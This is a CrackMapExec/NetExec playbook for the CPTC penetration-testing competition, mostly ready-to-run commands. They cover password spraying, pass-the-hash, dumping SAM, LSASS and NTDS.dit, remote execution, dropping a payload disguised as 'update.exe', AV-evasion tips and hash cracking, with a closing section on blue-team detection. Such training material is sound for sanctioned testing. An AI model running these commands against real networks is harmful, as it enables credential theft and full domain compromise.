# CrackMapExec - Advanced CPTC Guide

## Overview

CrackMapExec (a.k.a CME/NetExec) is a Swiss Army knife for post-exploitation and assessment of Active Directory networks. In CPTC, it's your primary tool for lateral movement, credential validation, and domain enumeration.

**Critical for CPTC:**
- **Time-efficient enumeration** across multiple hosts simultaneously
- **Credential validation** without triggering excessive lockouts
- **Stealthy lateral movement** with proper operational security
- **Quick wins** for demonstrating domain compromise impact

---

## Installation & Setup

```bash
# Install via pipx (recommended for CPTC - isolated environment)
pipx install crackmapexec

# Or install NetExec (maintained fork)
pipx install netexec

# Verify installation
crackmapexec --version
nxc --version  # if using NetExec

# Install all protocol dependencies
pipx inject crackmapexec pypsrp requests_ntlm minikerberos
```

---

## CPTC Competition Workflow

### Phase 1: Initial Reconnaissance (First 30 minutes)

```bash
# Quick network sweep for SMB hosts
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# Identify SMB signing status (relay attack opportunities)
crackmapexec smb 10.10.10.0/24 --gen-relay-list unsigned.txt

# Enumerate null sessions (anonymous access)
crackmapexec smb 10.10.10.0/24 -u '' -p ''

# Check for MS17-010 (EternalBlue) - quick wins
crackmapexec smb 10.10.10.0/24 -M ms17-010

# SMB version enumeration
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt -v
```

**CPTC Tip:** Create a target list immediately. Save all discovered hosts to files for later pivoting.

---

### Phase 2: Credential Validation (After obtaining creds)

```bash
# Test single credential across network
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!'

# Test credential with domain specification
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!' -d CORP

# Password spraying (CAREFUL - avoid lockouts!)
crackmapexec smb 10.10.10.1 -u users.txt -p 'Winter2024!' --continue-on-success

# Use hash instead of password (Pass-the-Hash)
crackmapexec smb 10.10.10.0/24 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# Local authentication attempt (useful for local admin reuse)
crackmapexec smb 10.10.10.0/24 -u 'administrator' -p 'Password123' --local-auth

# Check where domain user has local admin rights
crackmapexec smb targets.txt -u 'jsmith' -p 'Summer2024!' -d CORP
```

**Success Indicators:**
- `(Pwn3d!)` = Local admin access achieved
- Green `[+]` = Valid credentials
- Red `[-]` = Invalid credentials

**CPTC Lockout Prevention:**
```bash
# Check password policy BEFORE spraying
crackmapexec smb 10.10.10.1 -u 'guest' -p '' --pass-pol

# Single password spray with delays
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Winter2024!' --continue-on-success --jitter 5
```

---

### Phase 3: Deep Enumeration (Post-credential acquisition)

#### SMB Share Enumeration
```bash
# List all shares with read/write permissions
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!' --shares

# Spider shares for sensitive files (auto-download specific patterns)
crackmapexec smb 10.10.10.50 -u 'jsmith' -p 'Summer2024!' -M spider_plus -o READ_ONLY=false

# Search for specific file patterns in shares
crackmapexec smb 10.10.10.50 -u 'jsmith' -p 'Summer2024!' --spider C$ --pattern txt,pdf,docx

# Dump specific files from shares
crackmapexec smb 10.10.10.50 -u 'jsmith' -p 'Summer2024!' --get-file 'C$\Users\admin\Desktop\passwords.txt' ./passwords.txt
```

#### User and Session Enumeration
```bash
# Enumerate logged-on users (find high-value targets)
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!' --loggedon-users

# Enumerate domain users
crackmapexec smb 10.10.10.1 -u 'jsmith' -p 'Summer2024!' --users

# Enumerate domain groups
crackmapexec smb 10.10.10.1 -u 'jsmith' -p 'Summer2024!' --groups

# List local groups and members
crackmapexec smb 10.10.10.50 -u 'jsmith' -p 'Summer2024!' --local-groups

# Find domain admin sessions (PRIORITY TARGETS)
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!' --sessions
```

#### Active Directory Enumeration
```bash
# Enumerate all domain computers
crackmapexec ldap 10.10.10.1 -u 'jsmith' -p 'Summer2024!' --computers

# Find domain controllers
crackmapexec ldap 10.10.10.1 -u 'jsmith' -p 'Summer2024!' --dc-list

# Enumerate password policy via LDAP
crackmapexec ldap 10.10.10.1 -u 'jsmith' -p 'Summer2024!' -M get-desc-users

# ASREP Roasting opportunities
crackmapexec ldap 10.10.10.1 -u 'jsmith' -p 'Summer2024!' --asreproast asrep_hashes.txt

# Kerberoasting opportunities
crackmapexec ldap 10.10.10.1 -u 'jsmith' -p 'Summer2024!' --kerberoasting kerb_hashes.txt

# Dump LAPS passwords (if accessible)
crackmapexec ldap 10.10.10.1 -u 'jsmith' -p 'Summer2024!' -M laps
```

---

### Phase 4: Credential Harvesting

```bash
# Dump SAM database (local user hashes)
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'Password123' --sam

# Dump LSA secrets (service account passwords, cached creds)
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'Password123' --lsa

# Dump NTDS.dit (DOMAIN CONTROLLER ONLY - full domain compromise)
crackmapexec smb 10.10.10.1 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' --ntds

# Dump NTDS with specific user (faster, less detection)
crackmapexec smb 10.10.10.1 -u 'administrator' -p 'Password123' --ntds --user Administrator

# Alternative NTDS dump method using VSS
crackmapexec smb 10.10.10.1 -u 'administrator' -p 'Password123' --ntds vss
```

**CPTC Priority:** Focus on `--ntds` dump from DC = instant domain compromise evidence.

---

### Phase 5: Command Execution & Lateral Movement

#### Remote Command Execution
```bash
# Execute single command via SMB
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'Password123' -x 'whoami'

# Execute PowerShell command
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'Password123' -X '$PSVersionTable'

# Execute command across multiple hosts
crackmapexec smb 10.10.10.0/24 -u 'administrator' -p 'Password123' -x 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"'

# Execute with PS-EXEC method (classic)
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'Password123' --exec-method smbexec -x 'ipconfig'

# Execute via WMI (stealthier)
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'Password123' --exec-method wmiexec -x 'whoami'

# Execute via MMC20 (newer, stealthier)
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'Password123' --exec-method mmcexec -x 'hostname'
```

#### WinRM Execution (Modern Windows)
```bash
# Check if WinRM is accessible
crackmapexec winrm 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!'

# Execute commands via WinRM
crackmapexec winrm 10.10.10.50 -u 'jsmith' -p 'Summer2024!' -x 'whoami /all'

# Execute PowerShell via WinRM
crackmapexec winrm 10.10.10.50 -u 'jsmith' -p 'Summer2024!' -X 'Get-Service | Where-Object {$_.Status -eq "Running"}'
```

#### Advanced Execution Techniques
```bash
# Drop and execute payload
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'Password123' --put-file payload.exe C:\\Windows\\Temp\\update.exe
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'Password123' -x 'C:\\Windows\\Temp\\update.exe'

# Execute and retrieve output file
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'Password123' -x 'net user /domain > C:\\Windows\\Temp\\users.txt'
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'Password123' --get-file 'C$\Windows\Temp\users.txt' ./domain_users.txt
```

---

### Phase 6: Advanced Modules (CPTC Gold Mines)

```bash
# List all available modules
crackmapexec smb -L

# Show module information
crackmapexec smb -M lsassy --module-info

# Dump credentials from memory (LSASS) - CRITICAL
crackmapexec smb 10.10.10.0/24 -u 'administrator' -p 'Password123' -M lsassy

# Alternative credential dumping
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'Password123' -M mimikatz
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'Password123' -M nanodump

# Enumerate antivirus products
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!' -M enum_av

# Check for common vulnerabilities
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!' -M zerologon
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!' -M petitpotam
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!' -M nopac

# Token impersonation opportunities
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'Password123' -M tokens

# Enumerate MssQL servers and databases
crackmapexec mssql 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!'
crackmapexec mssql 10.10.10.55 -u 'jsmith' -p 'Summer2024!' --local-auth -M mssql_priv

# Check for delegation issues (unconstrained/constrained)
crackmapexec ldap 10.10.10.1 -u 'jsmith' -p 'Summer2024!' -M delegation

# Find Group Policy Preferences passwords (old networks)
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!' -M gpp_password

# Enumerate certificates (ESC attacks)
crackmapexec ldap 10.10.10.1 -u 'jsmith' -p 'Summer2024!' -M adcs
```

---

## CPTC-Specific Command Chains

### Scenario 1: Initial Access → Domain Admin
```bash
# 1. Discover network
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt

# 2. Found credentials via phishing
crackmapexec smb targets.txt -u 'jsmith' -p 'Summer2024!' -d CORP

# 3. Check where user is local admin
grep "Pwn3d" cme_output.txt

# 4. Dump credentials from owned machine
crackmapexec smb 10.10.10.50 -u 'jsmith' -p 'Summer2024!' -M lsassy

# 5. Found Domain Admin hash in memory
crackmapexec smb 10.10.10.1 -u 'dadmin' -H 'aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71'

# 6. Dump NTDS.dit
crackmapexec smb 10.10.10.1 -u 'dadmin' -H '...' --ntds --user '*'
```

### Scenario 2: Stealth Enumeration (No Admin Rights)
```bash
# Low-privilege enumeration
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!' --shares
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!' --sessions
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!' --loggedon-users
crackmapexec ldap 10.10.10.1 -u 'jsmith' -p 'Summer2024!' --asreproast asrep.txt
crackmapexec ldap 10.10.10.1 -u 'jsmith' -p 'Summer2024!' --kerberoasting kerb.txt

# Crack hashes offline
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

### Scenario 3: Finding High-Value Targets
```bash
# Find domain admins currently logged in
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!' --sessions | grep -i "domain admins\|enterprise admins"

# Check session data
crackmapexec smb 10.10.10.0/24 -u 'jsmith' -p 'Summer2024!' --loggedon-users | grep -i admin

# Prioritize these hosts for credential dumping
crackmapexec smb 10.10.10.75 -u 'localadmin' -p 'Found_Password' -M lsassy
```

---

## Operational Security (OpSec) for CPTC

### Avoid Account Lockouts
```bash
# ALWAYS check password policy first
crackmapexec smb 10.10.10.1 -u 'guest' -p '' --pass-pol

# Note: Lockout threshold and observation window
# If threshold = 5, use max 3 attempts per spray

# Safe password spraying
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'SinglePassword1!' --continue-on-success
# Wait 30+ minutes before next spray

# Use --jitter for realistic delays
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Password1!' --jitter 10
```

### Stealthy Execution Methods
```bash
# Prefer WinRM over SMB exec (less AV detection)
crackmapexec winrm 10.10.10.50 -u 'admin' -p 'Pass' -x 'command'

# Use WMI exec (no service creation)
crackmapexec smb 10.10.10.50 -u 'admin' -p 'Pass' --exec-method wmiexec -x 'command'

# Avoid mimikatz module (heavily signatured)
# Use lsassy or nanodump instead
crackmapexec smb 10.10.10.50 -u 'admin' -p 'Pass' -M lsassy
```

### Log Management
```bash
# CME creates logs in ~/.cme/logs/
# Organize by target for report generation

# Check database for all found credentials
cmedb

cme> creds
cme> hosts
cme> shares
```

---

## Protocol-Specific Commands

### SSH Protocol
```bash
# Credential validation over SSH
crackmapexec ssh 10.10.10.0/24 -u root -p passwords.txt

# Execute commands via SSH
crackmapexec ssh 10.10.10.100 -u root -p 'toor' -x 'cat /etc/shadow'

# Use SSH keys
crackmapexec ssh 10.10.10.100 -u root --key-file id_rsa
```

### MSSQL Protocol
```bash
# Enumerate MSSQL instances
crackmapexec mssql 10.10.10.0/24 -u 'sa' -p 'Password123'

# Execute SQL query
crackmapexec mssql 10.10.10.55 -u 'sa' -p 'Password123' -q 'SELECT @@version'

# Enable xp_cmdshell and execute OS commands
crackmapexec mssql 10.10.10.55 -u 'sa' -p 'Password123' -x 'whoami'
```

### RDP Protocol
```bash
# Check RDP access
crackmapexec rdp 10.10.10.0/24 -u 'administrator' -p 'Password123'

# Screenshot via RDP
crackmapexec rdp 10.10.10.50 -u 'administrator' -p 'Password123' -M rdp_screenshot
```

---

## CPTC Report Evidence Collection

```bash
# Capture all output to file
crackmapexec smb 10.10.10.0/24 -u 'admin' -p 'Pass' --sam 2>&1 | tee -a evidence_sam_dump.txt

# Screenshots of successful compromises
# Take screenshots of:
# - Initial credential validation (Pwn3d!)
# - NTDS.dit dump output
# - High-value user sessions found
# - Sensitive share access

# Export CME database for appendix
cmedb export

# Save command history
history | grep crackmapexec > cme_commands_used.txt
```

---

## Common CPTC Flags Reference

| Flag | Purpose | Example |
|------|---------|---------|
| `-u` | Username(s) | `-u 'jsmith'` or `-u users.txt` |
| `-p` | Password(s) | `-p 'Pass123!'` or `-p passwords.txt` |
| `-H` | NT hash (Pass-the-Hash) | `-H 'aad3b435b51404ee...'` |
| `-d` | Domain name | `-d CORP` |
| `-x` | Execute command (CMD) | `-x 'whoami'` |
| `-X` | Execute PowerShell | `-X 'Get-Process'` |
| `--shares` | Enumerate shares | `--shares` |
| `--sam` | Dump SAM database | `--sam` |
| `--lsa` | Dump LSA secrets | `--lsa` |
| `--ntds` | Dump NTDS.dit (DC) | `--ntds` |
| `-M` | Use module | `-M lsassy` |
| `--local-auth` | Use local auth | `--local-auth` |
| `--continue-on-success` | Don't stop on first success | Useful for spraying |
| `--gen-relay-list` | Output relay targets | `--gen-relay-list targets.txt` |

---

## Defensive Detection & Mitigation

**Blue Team Detection Signatures (What you trigger):**

1. **Event ID 4625** - Failed login attempts (password spraying)
   - Multiple failures from single source IP
   - Mitigation: Strong password policy, account lockout

2. **Event ID 4672** - Special privileges assigned (admin login)
   - Correlate with unusual source IPs
   - Mitigation: Privileged Access Workstations (PAWs)

3. **Event ID 4624 Type 3** - Network logon (lateral movement)
   - Rapid authentication across multiple hosts
   - Mitigation: Network segmentation, tiering

4. **Event ID 4688** - Process creation (command execution)
   - PowerShell, cmd.exe, wmic.exe execution via SYSTEM
   - Mitigation: PowerShell logging, constrained language mode

5. **Event ID 5145** - Network share access
   - Automated share enumeration patterns
   - Mitigation: Restrict share permissions, honeypot shares

6. **Sysmon Event ID 10** - Process access (LSASS dumping)
   - Lsassy, mimikatz modules accessing lsass.exe
   - Mitigation: Credential Guard, LSA protection

**Blue Team Recommendations:**
- Enable SMB signing (prevents relay attacks)
- Implement LAPS (Local Administrator Password Solution)
- Use tiered admin model (no DA on workstations)
- Deploy EDR with behavioral detection
- Monitor for DCSync attempts (Event ID 4662)

---

## Troubleshooting Common Issues

### Connection Failures
```bash
# Test connectivity first
crackmapexec smb 10.10.10.50 -u '' -p '' -v

# Check if port is open
nmap -p 445 10.10.10.50

# Try different SMB protocols
crackmapexec smb 10.10.10.50 -u 'user' -p 'pass' --port 139
```

### Authentication Failures
```bash
# Verify domain name
crackmapexec smb 10.10.10.1 -u '' -p '' --pass-pol

# Try with and without domain
crackmapexec smb 10.10.10.50 -u 'user' -p 'pass' -d CORP
crackmapexec smb 10.10.10.50 -u 'CORP\user' -p 'pass'

# Check local vs domain auth
crackmapexec smb 10.10.10.50 -u 'administrator' -p 'pass' --local-auth
```

### Execution Method Failures
```bash
# Try alternative exec methods
crackmapexec smb 10.10.10.50 -u 'admin' -p 'pass' --exec-method smbexec -x 'whoami'
crackmapexec smb 10.10.10.50 -u 'admin' -p 'pass' --exec-method wmiexec -x 'whoami'
crackmapexec smb 10.10.10.50 -u 'admin' -p 'pass' --exec-method atexec -x 'whoami'
crackmapexec smb 10.10.10.50 -u 'admin' -p 'pass' --exec-method mmcexec -x 'whoami'
```

---

## Advanced CPTC Tips & Tricks

### 1. Automate Target Prioritization
```bash
# Create high-value target list
crackmapexec smb 10.10.10.0/24 -u 'user' -p 'pass' --loggedon-users | \
  grep -i "admin\|backup\|sql\|service" > priority_targets.txt
```

### 2. Credential Combo Testing
```bash
# Found creds? Test everywhere immediately
found_user="jsmith"
found_pass="Summer2024!"
crackmapexec smb targets.txt -u "$found_user" -p "$found_pass" --continue-on-success
crackmapexec winrm targets.txt -u "$found_user" -p "$found_pass" --continue-on-success
crackmapexec mssql targets.txt -u "$found_user" -p "$found_pass" --continue-on-success
crackmapexec ssh targets.txt -u "$found_user" -p "$found_pass" --continue-on-success
```

### 3. Quick Domain Compromise Check
```bash
# One-liner to check if you have DC access
crackmapexec smb <DC-IP> -u 'found_user' -p 'found_pass' --ntds --just-dc-user krbtgt
# If this works, domain is fully compromised
```

### 4. Reporting Shortcuts
```bash
# Generate quick stats for report
echo "=== Compromised Hosts ===" > report_data.txt
grep "Pwn3d" ~/.cme/logs/*.log | wc -l >> report_data.txt
echo "=== Valid Credentials ===" >> report_data.txt
cmedb export | grep -i "credential" >> report_data.txt
```

### 5. Time Savers
```bash
# Alias common commands
alias cme='crackmapexec'
alias cme-shares='crackmapexec smb $1 -u $2 -p $3 --shares'
alias cme-spray='crackmapexec smb $1 -u users.txt -p $2 --continue-on-success'

# Save successful credentials immediately
echo "user:pass:10.10.10.50:admin" >> working_creds.txt
```

---

## Competition Day Checklist

**Pre-Competition:**
- [ ] Verify CME installation and modules
- [ ] Prepare wordlists (users, passwords)
- [ ] Set up logging directory structure
- [ ] Test CME in lab environment
- [ ] Create command cheatsheet printout

**During Competition:**
- [ ] Identify network range and DC IP
- [ ] Run initial SMB sweep and save targets
- [ ] Check password policy before spraying
- [ ] Document all working credentials immediately
- [ ] Prioritize DC access and NTDS.dit dump
- [ ] Take screenshots of critical findings
- [ ] Export CME database regularly

**Post-Exploitation:**
- [ ] Dump credentials from all owned hosts
- [ ] Test found credentials across network
- [ ] Enumerate for persistence opportunities
- [ ] Document lateral movement path
- [ ] Collect evidence for report

---

## References & Further Reading

**Official Documentation:**
- CrackMapExec Wiki: `https://github.com/byt3bl33d3r/CrackMapExec/wiki`
- NetExec (maintained fork): `https://github.com/Pennyw0rth/NetExec`
- CME Modules: `https://github.com/byt3bl33d3r/CrackMapExec/tree/master/cme/modules`

**CPTC-Specific Resources:**
- CPTC Technical Guide: Competition-specific AD attack paths
- HackTheBox Active Directory Labs: Practice environment
- GOAD (Game of Active Directory): Free AD lab

**Related Tools to Chain:**
- Impacket suite (secretsdump.py, GetUserSPNs.py)
- BloodHound (visualize attack paths)
- Kerbrute (faster Kerberos user enumeration)
- Responder (LLMNR/NBT-NS poisoning → creds)

**Advanced Topics:**
- Kerberos delegation abuse (unconstrained/constrained/RBCD)
- Active Directory Certificate Services (AD CS) attacks
- DCSync attack methodology
- Golden/Silver ticket creation post-NTDS dump

---

## Quick Reference Card

```bash
# Essential CPTC Commands (print this!)

# 1. Network Discovery
crackmapexec smb 10.10.10.0/24

# 2. Credential Validation
crackmapexec smb <target> -u '<user>' -p '<pass>' -d <domain>

# 3. Share Enumeration
crackmapexec smb <target> -u '<user>' -p '<pass>' --shares

# 4. Dump SAM
crackmapexec smb <target> -u '<admin>' -p '<pass>' --sam

# 5. Dump NTDS (Domain Compromise!)
crackmapexec smb <DC> -u '<admin>' -p '<pass>' --ntds

# 6. Credential Dumping from Memory
crackmapexec smb <target> -u '<admin>' -p '<pass>' -M lsassy

# 7. Command Execution
crackmapexec smb <target> -u '<admin>' -p '<pass>' -x 'whoami'

# 8. Kerberoasting
crackmapexec ldap <DC> -u '<user>' -p '<pass>' --kerberoasting kerb.txt

# 9. Find Logged-On Users
crackmapexec smb 10.10.10.0/24 -u '<user>' -p '<pass>' --loggedon-users

# 10. Pass-the-Hash
crackmapexec smb <target> -u '<user>' -H '<NTHASH>'
```
